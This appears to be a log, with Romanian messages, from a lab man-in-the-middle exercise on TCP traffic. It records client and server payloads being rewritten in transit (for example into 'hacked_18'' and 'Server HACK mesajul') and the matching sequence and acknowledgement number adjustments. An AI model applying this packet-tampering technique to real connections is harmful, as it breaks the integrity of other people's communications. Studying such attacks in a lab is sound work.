[LINE:76]# INFO     [2020-06-29 16:12:40,574]  
[LINE:77]# INFO     [2020-06-29 16:12:40,575]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:40,575]  
[LINE:80]# INFO     [2020-06-29 16:12:40,575]  [Before RAW Load]:  b"Server a primit mesajul: hacked_16'"
[LINE:184]# INFO     [2020-06-29 16:12:40,576]  
[LINE:185]# INFO     [2020-06-29 16:12:40,576]  [SERVER -- BEFORE] seq_nr 1963746811:1963746846 , ack = 3748974756
[LINE:186]# INFO     [2020-06-29 16:12:40,576]  client_ack_nr_expected = 3748974768
[LINE:187]# INFO     [2020-06-29 16:12:40,577]  
[LINE:260]# INFO     [2020-06-29 16:12:40,577]  
[LINE:261]# INFO     [2020-06-29 16:12:40,577]  [SERVER -- AFTER] seq_nr 1963746791:1963746826 , ack = 3748974768
[LINE:262]# INFO     [2020-06-29 16:12:40,577]  client_start_seq_nr_expected = 1963746826
[LINE:263]# INFO     [2020-06-29 16:12:40,578]  
[LINE:302]# INFO     [2020-06-29 16:12:40,579]  [After RAW Load]:  b"Server a primit mesajul: hacked_16'"
[LINE:303]# INFO     [2020-06-29 16:12:40,580]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:40,583]  
[LINE:77]# INFO     [2020-06-29 16:12:40,584]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:40,584]  
[LINE:268]# INFO     [2020-06-29 16:12:40,584]  
[LINE:269]# INFO     [2020-06-29 16:12:40,584]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:40,585]  Confirmare ack = 1963746826
[LINE:281]# INFO     [2020-06-29 16:12:40,585]  CLIENT flag A ==> ack = 1963746846
[LINE:303]# INFO     [2020-06-29 16:12:40,585]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:45,586]  
[LINE:77]# INFO     [2020-06-29 16:12:45,587]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:45,587]  
[LINE:80]# INFO     [2020-06-29 16:12:45,588]  [Before RAW Load]:  b'mesajul_17'
[LINE:99]# INFO     [2020-06-29 16:12:45,588]  
[LINE:100]# INFO     [2020-06-29 16:12:45,589]  [CLIENT -- BEFORE] seq_nr 3748974768:3748974778 , ack = 1963746826
[LINE:101]# INFO     [2020-06-29 16:12:45,589]  server_ack_nr_expected = 1963746846
[LINE:102]# INFO     [2020-06-29 16:12:45,589]  
[LINE:174]# INFO     [2020-06-29 16:12:45,590]  [CLIENT -- AFTER] seq_nr 3748974756:3748974766 , ack = 1963746846
[LINE:175]# INFO     [2020-06-29 16:12:45,590]  server_start_seq_nr_expected = 3748974766
[LINE:302]# INFO     [2020-06-29 16:12:45,590]  [After RAW Load]:  b'mesajul_17'
[LINE:303]# INFO     [2020-06-29 16:12:45,590]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:45,595]  
[LINE:77]# INFO     [2020-06-29 16:12:45,595]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:45,595]  
[LINE:80]# INFO     [2020-06-29 16:12:45,596]  [Before RAW Load]:  b'Server a primit mesajul: mesajul_17'
[LINE:184]# INFO     [2020-06-29 16:12:45,596]  
[LINE:185]# INFO     [2020-06-29 16:12:45,596]  [SERVER -- BEFORE] seq_nr 1963746846:1963746881 , ack = 3748974766
[LINE:186]# INFO     [2020-06-29 16:12:45,597]  client_ack_nr_expected = 3748974778
[LINE:187]# INFO     [2020-06-29 16:12:45,597]  
[LINE:260]# INFO     [2020-06-29 16:12:45,597]  
[LINE:261]# INFO     [2020-06-29 16:12:45,598]  [SERVER -- AFTER] seq_nr 1963746826:1963746861 , ack = 3748974778
[LINE:262]# INFO     [2020-06-29 16:12:45,598]  client_start_seq_nr_expected = 1963746861
[LINE:263]# INFO     [2020-06-29 16:12:45,598]  
[LINE:302]# INFO     [2020-06-29 16:12:45,598]  [After RAW Load]:  b'Server a primit mesajul: mesajul_17'
[LINE:303]# INFO     [2020-06-29 16:12:45,599]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:45,602]  
[LINE:77]# INFO     [2020-06-29 16:12:45,602]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:45,603]  
[LINE:268]# INFO     [2020-06-29 16:12:45,603]  
[LINE:269]# INFO     [2020-06-29 16:12:45,603]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:45,604]  Confirmare ack = 1963746861
[LINE:281]# INFO     [2020-06-29 16:12:45,604]  CLIENT flag A ==> ack = 1963746881
[LINE:303]# INFO     [2020-06-29 16:12:45,604]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:50,610]  
[LINE:77]# INFO     [2020-06-29 16:12:50,610]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:50,610]  
[LINE:80]# INFO     [2020-06-29 16:12:50,611]  [Before RAW Load]:  b'mesajul_18'
[LINE:99]# INFO     [2020-06-29 16:12:50,611]  
[LINE:100]# INFO     [2020-06-29 16:12:50,612]  [CLIENT -- BEFORE] seq_nr 3748974778:3748974788 , ack = 1963746861
[LINE:101]# INFO     [2020-06-29 16:12:50,612]  server_ack_nr_expected = 1963746881
[LINE:102]# INFO     [2020-06-29 16:12:50,612]  
[LINE:174]# INFO     [2020-06-29 16:12:50,613]  [CLIENT -- AFTER] seq_nr 3748974766:3748974776 , ack = 1963746881
[LINE:175]# INFO     [2020-06-29 16:12:50,613]  server_start_seq_nr_expected = 3748974776
[LINE:302]# INFO     [2020-06-29 16:12:50,613]  [After RAW Load]:  b"hacked_18'"
[LINE:303]# INFO     [2020-06-29 16:12:50,613]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:50,618]  
[LINE:77]# INFO     [2020-06-29 16:12:50,618]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:50,619]  
[LINE:80]# INFO     [2020-06-29 16:12:50,619]  [Before RAW Load]:  b"Server a primit mesajul: hacked_18'"
[LINE:184]# INFO     [2020-06-29 16:12:50,620]  
[LINE:185]# INFO     [2020-06-29 16:12:50,620]  [SERVER -- BEFORE] seq_nr 1963746881:1963746916 , ack = 3748974776
[LINE:186]# INFO     [2020-06-29 16:12:50,620]  client_ack_nr_expected = 3748974788
[LINE:187]# INFO     [2020-06-29 16:12:50,620]  
[LINE:260]# INFO     [2020-06-29 16:12:50,621]  
[LINE:261]# INFO     [2020-06-29 16:12:50,621]  [SERVER -- AFTER] seq_nr 1963746861:1963746896 , ack = 3748974788
[LINE:262]# INFO     [2020-06-29 16:12:50,621]  client_start_seq_nr_expected = 1963746896
[LINE:263]# INFO     [2020-06-29 16:12:50,622]  
[LINE:302]# INFO     [2020-06-29 16:12:50,622]  [After RAW Load]:  b"Server a hacked mesajul: hacked_18'"
[LINE:303]# INFO     [2020-06-29 16:12:50,622]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:50,626]  
[LINE:77]# INFO     [2020-06-29 16:12:50,627]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:50,627]  
[LINE:268]# INFO     [2020-06-29 16:12:50,627]  
[LINE:269]# INFO     [2020-06-29 16:12:50,627]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:50,628]  Confirmare ack = 1963746896
[LINE:281]# INFO     [2020-06-29 16:12:50,628]  CLIENT flag A ==> ack = 1963746916
[LINE:303]# INFO     [2020-06-29 16:12:50,628]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:55,633]  
[LINE:77]# INFO     [2020-06-29 16:12:55,634]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:55,634]  
[LINE:80]# INFO     [2020-06-29 16:12:55,635]  [Before RAW Load]:  b'mesajul_19'
[LINE:99]# INFO     [2020-06-29 16:12:55,635]  
[LINE:100]# INFO     [2020-06-29 16:12:55,636]  [CLIENT -- BEFORE] seq_nr 3748974788:3748974798 , ack = 1963746896
[LINE:101]# INFO     [2020-06-29 16:12:55,636]  server_ack_nr_expected = 1963746916
[LINE:102]# INFO     [2020-06-29 16:12:55,636]  
[LINE:174]# INFO     [2020-06-29 16:12:55,637]  [CLIENT -- AFTER] seq_nr 3748974776:3748974786 , ack = 1963746916
[LINE:175]# INFO     [2020-06-29 16:12:55,637]  server_start_seq_nr_expected = 3748974786
[LINE:302]# INFO     [2020-06-29 16:12:55,638]  [After RAW Load]:  b'mesajul_19'
[LINE:303]# INFO     [2020-06-29 16:12:55,638]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:55,642]  
[LINE:77]# INFO     [2020-06-29 16:12:55,643]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:12:55,643]  
[LINE:80]# INFO     [2020-06-29 16:12:55,644]  [Before RAW Load]:  b'Server a primit mesajul: mesajul_19'
[LINE:184]# INFO     [2020-06-29 16:12:55,645]  
[LINE:185]# INFO     [2020-06-29 16:12:55,645]  [SERVER -- BEFORE] seq_nr 1963746916:1963746951 , ack = 3748974786
[LINE:186]# INFO     [2020-06-29 16:12:55,645]  client_ack_nr_expected = 3748974798
[LINE:187]# INFO     [2020-06-29 16:12:55,646]  
[LINE:260]# INFO     [2020-06-29 16:12:55,647]  
[LINE:261]# INFO     [2020-06-29 16:12:55,647]  [SERVER -- AFTER] seq_nr 1963746896:1963746931 , ack = 3748974798
[LINE:262]# INFO     [2020-06-29 16:12:55,647]  client_start_seq_nr_expected = 1963746931
[LINE:263]# INFO     [2020-06-29 16:12:55,648]  
[LINE:302]# INFO     [2020-06-29 16:12:55,648]  [After RAW Load]:  b'Server a hacked mesajul: mesajul_19'
[LINE:303]# INFO     [2020-06-29 16:12:55,649]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:12:55,652]  
[LINE:77]# INFO     [2020-06-29 16:12:55,653]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:12:55,653]  
[LINE:268]# INFO     [2020-06-29 16:12:55,654]  
[LINE:269]# INFO     [2020-06-29 16:12:55,655]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:12:55,655]  Confirmare ack = 1963746931
[LINE:281]# INFO     [2020-06-29 16:12:55,656]  CLIENT flag A ==> ack = 1963746951
[LINE:303]# INFO     [2020-06-29 16:12:55,656]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:00,660]  
[LINE:77]# INFO     [2020-06-29 16:13:00,661]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:00,661]  
[LINE:80]# INFO     [2020-06-29 16:13:00,661]  [Before RAW Load]:  b'mesajul_20'
[LINE:99]# INFO     [2020-06-29 16:13:00,661]  
[LINE:100]# INFO     [2020-06-29 16:13:00,662]  [CLIENT -- BEFORE] seq_nr 3748974798:3748974808 , ack = 1963746931
[LINE:101]# INFO     [2020-06-29 16:13:00,662]  server_ack_nr_expected = 1963746951
[LINE:102]# INFO     [2020-06-29 16:13:00,662]  
[LINE:174]# INFO     [2020-06-29 16:13:00,663]  [CLIENT -- AFTER] seq_nr 3748974786:3748974792 , ack = 1963746951
[LINE:175]# INFO     [2020-06-29 16:13:00,663]  server_start_seq_nr_expected = 3748974792
[LINE:302]# INFO     [2020-06-29 16:13:00,663]  [After RAW Load]:  b"mH_20'"
[LINE:303]# INFO     [2020-06-29 16:13:00,663]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:00,668]  
[LINE:77]# INFO     [2020-06-29 16:13:00,668]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:00,669]  
[LINE:80]# INFO     [2020-06-29 16:13:00,669]  [Before RAW Load]:  b"Server a primit mesajul: mH_20'"
[LINE:184]# INFO     [2020-06-29 16:13:00,670]  
[LINE:185]# INFO     [2020-06-29 16:13:00,670]  [SERVER -- BEFORE] seq_nr 1963746951:1963746982 , ack = 3748974792
[LINE:186]# INFO     [2020-06-29 16:13:00,670]  client_ack_nr_expected = 3748974808
[LINE:187]# INFO     [2020-06-29 16:13:00,670]  
[LINE:260]# INFO     [2020-06-29 16:13:00,671]  
[LINE:261]# INFO     [2020-06-29 16:13:00,671]  [SERVER -- AFTER] seq_nr 1963746931:1963746962 , ack = 3748974808
[LINE:262]# INFO     [2020-06-29 16:13:00,672]  client_start_seq_nr_expected = 1963746962
[LINE:263]# INFO     [2020-06-29 16:13:00,672]  
[LINE:302]# INFO     [2020-06-29 16:13:00,672]  [After RAW Load]:  b"Server a primit mesajul: mH_20'"
[LINE:303]# INFO     [2020-06-29 16:13:00,672]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:00,677]  
[LINE:77]# INFO     [2020-06-29 16:13:00,678]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:00,678]  
[LINE:268]# INFO     [2020-06-29 16:13:00,678]  
[LINE:269]# INFO     [2020-06-29 16:13:00,678]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:00,679]  Confirmare ack = 1963746962
[LINE:281]# INFO     [2020-06-29 16:13:00,679]  CLIENT flag A ==> ack = 1963746982
[LINE:303]# INFO     [2020-06-29 16:13:00,680]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:05,684]  
[LINE:77]# INFO     [2020-06-29 16:13:05,684]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:05,685]  
[LINE:80]# INFO     [2020-06-29 16:13:05,685]  [Before RAW Load]:  b'mesajul_21'
[LINE:99]# INFO     [2020-06-29 16:13:05,685]  
[LINE:100]# INFO     [2020-06-29 16:13:05,686]  [CLIENT -- BEFORE] seq_nr 3748974808:3748974818 , ack = 1963746962
[LINE:101]# INFO     [2020-06-29 16:13:05,686]  server_ack_nr_expected = 1963746982
[LINE:102]# INFO     [2020-06-29 16:13:05,686]  
[LINE:174]# INFO     [2020-06-29 16:13:05,687]  [CLIENT -- AFTER] seq_nr 3748974792:3748974802 , ack = 1963746982
[LINE:175]# INFO     [2020-06-29 16:13:05,687]  server_start_seq_nr_expected = 3748974802
[LINE:302]# INFO     [2020-06-29 16:13:05,687]  [After RAW Load]:  b'mesajul_21'
[LINE:303]# INFO     [2020-06-29 16:13:05,687]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:05,693]  
[LINE:77]# INFO     [2020-06-29 16:13:05,694]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:05,694]  
[LINE:80]# INFO     [2020-06-29 16:13:05,696]  [Before RAW Load]:  b'Server a primit mesajul: mesajul_21'
[LINE:184]# INFO     [2020-06-29 16:13:05,696]  
[LINE:185]# INFO     [2020-06-29 16:13:05,696]  [SERVER -- BEFORE] seq_nr 1963746982:1963747017 , ack = 3748974802
[LINE:186]# INFO     [2020-06-29 16:13:05,697]  client_ack_nr_expected = 3748974818
[LINE:187]# INFO     [2020-06-29 16:13:05,697]  
[LINE:260]# INFO     [2020-06-29 16:13:05,698]  
[LINE:261]# INFO     [2020-06-29 16:13:05,698]  [SERVER -- AFTER] seq_nr 1963746962:1963746993 , ack = 3748974818
[LINE:262]# INFO     [2020-06-29 16:13:05,698]  client_start_seq_nr_expected = 1963746993
[LINE:263]# INFO     [2020-06-29 16:13:05,699]  
[LINE:302]# INFO     [2020-06-29 16:13:05,699]  [After RAW Load]:  b'Server HACK mesajul: mesajul_21'
[LINE:303]# INFO     [2020-06-29 16:13:05,699]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:05,704]  
[LINE:77]# INFO     [2020-06-29 16:13:05,704]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:05,704]  
[LINE:268]# INFO     [2020-06-29 16:13:05,705]  
[LINE:269]# INFO     [2020-06-29 16:13:05,705]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:05,705]  Confirmare ack = 1963746993
[LINE:281]# INFO     [2020-06-29 16:13:05,706]  CLIENT flag A ==> ack = 1963747017
[LINE:303]# INFO     [2020-06-29 16:13:05,706]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:10,711]  
[LINE:77]# INFO     [2020-06-29 16:13:10,711]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:10,712]  
[LINE:80]# INFO     [2020-06-29 16:13:10,712]  [Before RAW Load]:  b'mesajul_22'
[LINE:99]# INFO     [2020-06-29 16:13:10,712]  
[LINE:100]# INFO     [2020-06-29 16:13:10,713]  [CLIENT -- BEFORE] seq_nr 3748974818:3748974828 , ack = 1963746993
[LINE:101]# INFO     [2020-06-29 16:13:10,713]  server_ack_nr_expected = 1963747017
[LINE:102]# INFO     [2020-06-29 16:13:10,714]  
[LINE:174]# INFO     [2020-06-29 16:13:10,715]  [CLIENT -- AFTER] seq_nr 3748974802:3748974812 , ack = 1963747017
[LINE:175]# INFO     [2020-06-29 16:13:10,715]  server_start_seq_nr_expected = 3748974812
[LINE:302]# INFO     [2020-06-29 16:13:10,715]  [After RAW Load]:  b"hacked_22'"
[LINE:303]# INFO     [2020-06-29 16:13:10,715]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:10,720]  
[LINE:77]# INFO     [2020-06-29 16:13:10,721]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 PA / Raw
[LINE:78]# INFO     [2020-06-29 16:13:10,721]  
[LINE:80]# INFO     [2020-06-29 16:13:10,722]  [Before RAW Load]:  b"Server a primit mesajul: hacked_22'"
[LINE:184]# INFO     [2020-06-29 16:13:10,723]  
[LINE:185]# INFO     [2020-06-29 16:13:10,723]  [SERVER -- BEFORE] seq_nr 1963747017:1963747052 , ack = 3748974812
[LINE:186]# INFO     [2020-06-29 16:13:10,723]  client_ack_nr_expected = 3748974828
[LINE:187]# INFO     [2020-06-29 16:13:10,723]  
[LINE:260]# INFO     [2020-06-29 16:13:10,724]  
[LINE:261]# INFO     [2020-06-29 16:13:10,725]  [SERVER -- AFTER] seq_nr 1963746993:1963747024 , ack = 3748974828
[LINE:262]# INFO     [2020-06-29 16:13:10,725]  client_start_seq_nr_expected = 1963747024
[LINE:263]# INFO     [2020-06-29 16:13:10,725]  
[LINE:302]# INFO     [2020-06-29 16:13:10,725]  [After RAW Load]:  b"Server HACK mesajul: hacked_22'"
[LINE:303]# INFO     [2020-06-29 16:13:10,726]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:10,727]  
[LINE:77]# INFO     [2020-06-29 16:13:10,728]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:10,728]  
[LINE:268]# INFO     [2020-06-29 16:13:10,728]  
[LINE:269]# INFO     [2020-06-29 16:13:10,728]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:10,728]  Confirmare ack = 1963747024
[LINE:281]# INFO     [2020-06-29 16:13:10,729]  CLIENT flag A ==> ack = 1963747052
[LINE:303]# INFO     [2020-06-29 16:13:10,729]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:12,889]  
[LINE:77]# INFO     [2020-06-29 16:13:12,890]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 FA
[LINE:78]# INFO     [2020-06-29 16:13:12,891]  
[LINE:268]# INFO     [2020-06-29 16:13:12,891]  
[LINE:269]# INFO     [2020-06-29 16:13:12,891]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:12,892]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:12,895]  
[LINE:77]# INFO     [2020-06-29 16:13:12,895]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:12,896]  
[LINE:268]# INFO     [2020-06-29 16:13:12,896]  
[LINE:269]# INFO     [2020-06-29 16:13:12,896]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:12,897]  Confirmare ack = 1963747024
[LINE:281]# INFO     [2020-06-29 16:13:12,897]  CLIENT flag A ==> ack = 1963747052
[LINE:303]# INFO     [2020-06-29 16:13:12,897]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,109]  
[LINE:77]# INFO     [2020-06-29 16:13:13,109]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 FA
[LINE:78]# INFO     [2020-06-29 16:13:13,109]  
[LINE:268]# INFO     [2020-06-29 16:13:13,109]  
[LINE:269]# INFO     [2020-06-29 16:13:13,109]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:13,110]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,112]  
[LINE:77]# INFO     [2020-06-29 16:13:13,112]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:13,112]  
[LINE:268]# INFO     [2020-06-29 16:13:13,112]  
[LINE:269]# INFO     [2020-06-29 16:13:13,112]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:13,112]  Confirmare ack = 1963747024
[LINE:281]# INFO     [2020-06-29 16:13:13,113]  CLIENT flag A ==> ack = 1963747052
[LINE:303]# INFO     [2020-06-29 16:13:13,113]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,330]  
[LINE:77]# INFO     [2020-06-29 16:13:13,330]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 FA
[LINE:78]# INFO     [2020-06-29 16:13:13,331]  
[LINE:268]# INFO     [2020-06-29 16:13:13,331]  
[LINE:269]# INFO     [2020-06-29 16:13:13,331]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:13,331]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,334]  
[LINE:77]# INFO     [2020-06-29 16:13:13,335]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:13,335]  
[LINE:268]# INFO     [2020-06-29 16:13:13,336]  
[LINE:269]# INFO     [2020-06-29 16:13:13,336]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:13,336]  Confirmare ack = 1963747024
[LINE:281]# INFO     [2020-06-29 16:13:13,337]  CLIENT flag A ==> ack = 1963747052
[LINE:303]# INFO     [2020-06-29 16:13:13,337]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,648]  
[LINE:77]# INFO     [2020-06-29 16:13:13,648]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 FA
[LINE:78]# INFO     [2020-06-29 16:13:13,648]  
[LINE:268]# INFO     [2020-06-29 16:13:13,648]  
[LINE:269]# INFO     [2020-06-29 16:13:13,648]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:13,649]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,651]  
[LINE:77]# INFO     [2020-06-29 16:13:13,652]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 A
[LINE:78]# INFO     [2020-06-29 16:13:13,652]  
[LINE:268]# INFO     [2020-06-29 16:13:13,652]  
[LINE:269]# INFO     [2020-06-29 16:13:13,652]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:13,653]  Confirmare ack = 3748974812
[LINE:289]# INFO     [2020-06-29 16:13:13,653]  SERVER flag A ==> ack = 3748974828
[LINE:303]# INFO     [2020-06-29 16:13:13,653]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,777]  
[LINE:77]# INFO     [2020-06-29 16:13:13,777]  [Summary packet]:IP / TCP 198.7.0.2:10040 > 172.7.0.2:56326 FA
[LINE:78]# INFO     [2020-06-29 16:13:13,777]  
[LINE:268]# INFO     [2020-06-29 16:13:13,777]  
[LINE:269]# INFO     [2020-06-29 16:13:13,778]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:13,778]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,780]  
[LINE:77]# INFO     [2020-06-29 16:13:13,780]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 A
[LINE:78]# INFO     [2020-06-29 16:13:13,780]  
[LINE:268]# INFO     [2020-06-29 16:13:13,781]  
[LINE:269]# INFO     [2020-06-29 16:13:13,781]  Alt tip de pachet.  Flag = A
[LINE:273]# INFO     [2020-06-29 16:13:13,781]  Confirmare ack = 1963747024
[LINE:281]# INFO     [2020-06-29 16:13:13,781]  CLIENT flag A ==> ack = 1963747052
[LINE:303]# INFO     [2020-06-29 16:13:13,781]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:13,869]  
[LINE:77]# INFO     [2020-06-29 16:13:13,869]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 FA
[LINE:78]# INFO     [2020-06-29 16:13:13,869]  
[LINE:268]# INFO     [2020-06-29 16:13:13,869]  
[LINE:269]# INFO     [2020-06-29 16:13:13,870]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:13,870]  ----------------------------------------
[LINE:76]# INFO     [2020-06-29 16:13:14,093]  
[LINE:77]# INFO     [2020-06-29 16:13:14,094]  [Summary packet]:IP / TCP 172.7.0.2:56326 > 198.7.0.2:10040 FA
[LINE:78]# INFO     [2020-06-29 16:13:14,094]  
[LINE:268]# INFO     [2020-06-29 16:13:14,095]  
[LINE:269]# INFO     [2020-06-29 16:13:14,095]  Alt tip de pachet.  Flag = FA
[LINE:303]# INFO     [2020-06-29 16:13:14,095]  ----------------------------------------

```
